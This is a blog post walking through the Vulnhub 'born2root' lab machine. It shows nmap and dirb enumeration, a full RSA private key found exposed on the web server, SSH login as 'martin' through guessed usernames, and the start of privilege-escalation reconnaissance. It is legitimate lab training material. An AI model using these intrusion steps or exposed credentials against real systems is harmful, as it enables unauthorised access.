
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="After the bulldog machine I worked on the born2root one. A simple boot2root machine by Hadi Mene." name="description"/>
<meta content="security, vulnhub, boot2root, linux" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="Vulnhub, born2root" property="og:title"/>
<meta content="After the bulldog machine I worked on the born2root one. A simple boot2root machine by Hadi Mene." property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2017/11/vulnhub-born2root.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2017-11-20 16:00:00+01:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="security" property="article:tag"/>
<meta content="vulnhub" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="linux" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – Vulnhub, born2root</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-email" href="mailto:postmater at maggick dot fr" target="_blank">
<i class="fa-brands fa-email"></i>
</a>
</li>
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="https://discord.com/users/maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
<li>
<a class="sc-reddit" href="https://www.reddit.com/user/maaggick/" target="_blank">
<i class="fa-brands fa-reddit"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="vulnhub-born2root">Vulnhub, born2root</h1>
<p>
      Posted on 20 Nov 2017 in <a href="../../category/security.html">security</a>

        • 5 min read
    </p>
</header>
<div>
<p><img alt="Born2root homepage" class="align-left" src="/media/2017.11/born2root/1.png" width="162"/></p>
<p>After the bulldog machine I worked on the <a href="https://www.vulnhub.com/entry/born2root-1,197/">born2root</a> one.
A simple boot2root machine by <a href="https://twitter.com/h4d3sw0rm">Hadi Mene</a>.</p>
<h2>Discovery</h2>
<p>First we scan all port of the VM:</p>
<div class="highlight"><pre><span></span><code>root@kalili:~# nmap -sSV 10.0.2.5

Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-14 15:43 CET
Nmap scan report for 10.0.2.5
Host is up (0.00036s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:84:43:C4 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
</code></pre></div>
<p>So we got a SSH service on port 22 and a web service on the port 80.
Let's see what the website propose:</p>
<h2>Web</h2>
<p>The website simulate a company selling security services:</p>
<p><img alt="Landing page" class="image-process-article-image" src="/media/2017.11/born2root/derivatives/article-image/1.png"/></p>
<p>The robots.txt file contain 2 url:</p>
<div class="highlight"><pre><span></span><code>User-agent: *
Disallow: /wordpress-blog
Disallow: /files
</code></pre></div>
<p>The <code>/wordpress-blog</code> lead us to a simple image:</p>
<p><img alt="Troll" class="image-process-article-image" src="/media/2017.11/born2root/derivatives/article-image/2.png"/></p>
<p>The /files give us an empty directory listing:</p>
<p><img alt="Directory listing" class="image-process-article-image" src="/media/2017.11/born2root/derivatives/article-image/4.png"/></p>
<p>We launch <code>dirb</code> against the site:</p>
<div class="highlight"><pre><span></span><code><span class="n">root</span><span class="nv">@kalili</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">dirb</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="p">)</span>
<span class="o">-----------------</span>
<span class="n">DIRB</span><span class="w"> </span><span class="n">v2</span><span class="mf">.22</span>
<span class="k">By</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Dark</span><span class="w"> </span><span class="n">Raver</span>
<span class="o">-----------------</span>

<span class="nl">START_TIME</span><span class="p">:</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">45</span><span class="err">:</span><span class="mi">36</span><span class="w"> </span><span class="mi">2017</span>
<span class="nl">URL_BASE</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span>
<span class="nl">WORDLIST_FILES</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">txt</span>

<span class="o">-----------------</span>

<span class="n">GENERATED</span><span class="w"> </span><span class="nl">WORDS</span><span class="p">:</span><span class="w"> </span><span class="mi">4612</span>

<span class="o">----</span><span class="w"> </span><span class="n">Scanning</span><span class="w"> </span><span class="nl">URL</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="w"> </span><span class="o">----</span>
<span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">files</span><span class="o">/</span>
<span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">icons</span><span class="o">/</span>
<span class="o">+</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">html</span><span class="w"> </span><span class="p">(</span><span class="nl">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="err">:</span><span class="mi">5651</span><span class="p">)</span>
<span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">manual</span><span class="o">/</span>
<span class="o">+</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">robots</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="p">(</span><span class="nl">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="err">:</span><span class="mi">57</span><span class="p">)</span>
<span class="o">+</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span><span class="w"> </span><span class="p">(</span><span class="nl">CODE</span><span class="p">:</span><span class="mi">403</span><span class="o">|</span><span class="k">SIZE</span><span class="err">:</span><span class="mi">296</span><span class="p">)</span>

<span class="o">----</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="nl">directory</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="w"> </span><span class="o">----</span>
<span class="p">(</span><span class="err">!</span><span class="p">)</span><span class="w"> </span><span class="nl">WARNING</span><span class="p">:</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="n">LISTABLE</span><span class="p">.</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">it</span><span class="p">.</span><span class="w"> </span><span class="p">(</span><span class="k">Use</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="s1">'-w'</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">anyway</span><span class="p">)</span>
<span class="o">----</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="nl">directory</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">icons</span><span class="o">/</span><span class="w"> </span><span class="o">----</span>
<span class="p">(</span><span class="err">!</span><span class="p">)</span><span class="w"> </span><span class="nl">WARNING</span><span class="p">:</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="n">LISTABLE</span><span class="p">.</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">it</span><span class="p">.</span><span class="w"> </span><span class="p">(</span><span class="k">Use</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="s1">'-w'</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">anyway</span><span class="p">)</span>
<span class="o">----</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="nl">directory</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">manual</span><span class="o">/</span><span class="w"> </span><span class="o">----</span>
<span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">manual</span><span class="o">/</span><span class="n">da</span><span class="o">/</span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
</code></pre></div>
<p>It found an interesting directory: <code>icons</code> it contains a lot of icon and a file VDSoyuAXiO.txt:</p>
<div class="highlight"><pre><span></span><code><span class="gh">-----BEGIN RSA PRIVATE KEY-----</span>
<span class="s">MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC</span>
<span class="s">tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0</span>
<span class="s">FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx</span>
<span class="s">5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv</span>
<span class="s">DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI</span>
<span class="s">/P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E</span>
<span class="s">LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw</span>
<span class="s">+rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS</span>
<span class="s">sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta</span>
<span class="s">lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn</span>
<span class="s">kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy</span>
<span class="s">FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX</span>
<span class="s">4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB</span>
<span class="s">WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC</span>
<span class="s">fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l</span>
<span class="s">Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s</span>
<span class="s">KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq</span>
<span class="s">C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ</span>
<span class="s">kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v</span>
<span class="s">VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J</span>
<span class="s">4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH</span>
<span class="s">dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC</span>
<span class="s">XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR</span>
<span class="s">2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43</span>
<span class="s">rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+</span>
<span class="gh">-----END RSA PRIVATE KEY-----</span>
</code></pre></div>
<p>This looks like an ssh private key. We extract the associated public key:</p>
<div class="highlight"><pre><span></span><code>openssl rsa -in .ssh/id_rsa -pubout -out key.pub
</code></pre></div>
<p>And we convert it to  ssh format:</p>
<div class="highlight"><pre><span></span><code>ssh-keygen -f key.pub -i -mPKCS8
</code></pre></div>
<p>The we can copy the private key to <code>~/.ssh/id_rsa</code> and the public key to <code>~/.ssh/id_rsa.pub</code></p>
<p>But we have no idea of the associated user. We try the one listed on the site main page:</p>
<ul>
<li>Martin N =&gt; martin, martinn, nmartin</li>
<li>Hadi M =&gt; hadi, hadim, mhadi</li>
<li>Jimmy S =&gt; jimmy, jymmys, sjimmy</li>
</ul>
<p>And we got a shell with the first one: martin. The server is asking us for a password, but we already got a shell. Entering anything will give use the focus and <code>CTRL-C</code> it will give us a simple error message.</p>
<div class="highlight"><pre><span></span><code><span class="n">root</span><span class="err">@</span><span class="n">kalili</span><span class="p">:</span><span class="o">~</span><span class="c1"># ssh 10.0.2.5 -i .ssh/id_rsa -lmartin</span>

<span class="n">The</span><span class="w"> </span><span class="n">programs</span><span class="w"> </span><span class="n">included</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Debian</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">free</span><span class="w"> </span><span class="n">software</span><span class="p">;</span>
<span class="n">the</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">distribution</span><span class="w"> </span><span class="n">terms</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">each</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">described</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span>
<span class="n">individual</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/*/</span><span class="n">copyright</span><span class="o">.</span>

<span class="n">Debian</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="n">comes</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">ABSOLUTELY</span><span class="w"> </span><span class="n">NO</span><span class="w"> </span><span class="n">WARRANTY</span><span class="p">,</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">extent</span>
<span class="n">permitted</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">applicable</span><span class="w"> </span><span class="n">law</span><span class="o">.</span>
<span class="n">Last</span><span class="w"> </span><span class="n">login</span><span class="p">:</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">00</span><span class="w"> </span><span class="mi">2017</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.15</span>

<span class="n">READY</span><span class="w"> </span><span class="n">TO</span><span class="w"> </span><span class="n">ACCESS</span><span class="w"> </span><span class="n">THE</span><span class="w"> </span><span class="n">SECRET</span><span class="w"> </span><span class="n">LAB</span><span class="w"> </span><span class="err">?</span>

<span class="n">secret</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="o">^</span><span class="n">CTraceback</span><span class="w"> </span><span class="p">(</span><span class="n">most</span><span class="w"> </span><span class="n">recent</span><span class="w"> </span><span class="n">call</span><span class="w"> </span><span class="n">last</span><span class="p">):</span>
<span class="w">  </span><span class="n">File</span><span class="w"> </span><span class="s2">"/var/tmp/login.py"</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
<span class="w">    </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">raw_input</span><span class="p">(</span><span class="s2">"secret password : "</span><span class="p">)</span>
<span class="n">KeyboardInterrupt</span>
</code></pre></div>
<p>The program doesn't seems to work as intended:</p>
<div class="highlight"><pre><span></span><code><span class="n">martin</span><span class="nd">@debian</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="n">py</span>
<span class="c1">#!/usr/bin/python</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">""</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">"READY TO ACCESS THE SECRET LAB ? "</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">""</span><span class="p">)</span>
<span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">raw_input</span><span class="p">(</span><span class="s2">"secret password : "</span><span class="p">)</span>

<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">"secretsec"</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="s2">"secretlab"</span><span class="w"> </span><span class="p">:</span>
<span class="w">  </span><span class="nb">print</span><span class="p">(</span><span class="s2">"WELCOME ! "</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
<span class="w">  </span><span class="nb">print</span><span class="p">(</span><span class="s2">"GET OUT ! "</span><span class="p">)</span>
<span class="w">  </span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">"pkill -u 'martin'"</span><span class="p">)</span>
</code></pre></div>
<h2>Privilege elevation</h2>
<p>As always a bit of reconnaissance is needed.</p>
<div class="highlight"><pre><span></span><code><span class="n">martin</span><span class="nv">@debian</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">alRh</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="err">:</span>
<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>

<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="nl">hadi</span><span class="p">:</span>
<span class="n">total</span><span class="w"> </span><span class="mi">60</span><span class="n">K</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="p">.</span>
<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">9</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">17</span><span class="w"> </span><span class="p">..</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">avril</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="n">K</span><span class="w"> </span><span class="n">avril</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="mi">3</span><span class="n">K</span><span class="w"> </span><span class="n">mai</span><span class="w">   </span><span class="mi">10</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="n">buff</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="n">K</span><span class="w"> </span><span class="n">mai</span><span class="w">   </span><span class="mi">10</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="n">buff</span><span class="p">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">148</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">25</span><span class="w"> </span><span class="n">example</span><span class="p">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-------</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="n">K</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="p">.</span><span class="n">gdb_history</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="mi">9</span><span class="n">K</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">38</span><span class="w"> </span><span class="n">overflow</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">   </span><span class="mi">19</span><span class="w"> </span><span class="n">mai</span><span class="w">   </span><span class="mi">10</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="n">peda</span><span class="o">-</span><span class="k">session</span><span class="o">-</span><span class="n">buff</span><span class="p">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">    </span><span class="mi">5</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="n">peda</span><span class="o">-</span><span class="k">session</span><span class="o">-</span><span class="n">overflow</span><span class="p">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w">  </span><span class="mi">675</span><span class="w"> </span><span class="n">avril</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">profile</span>
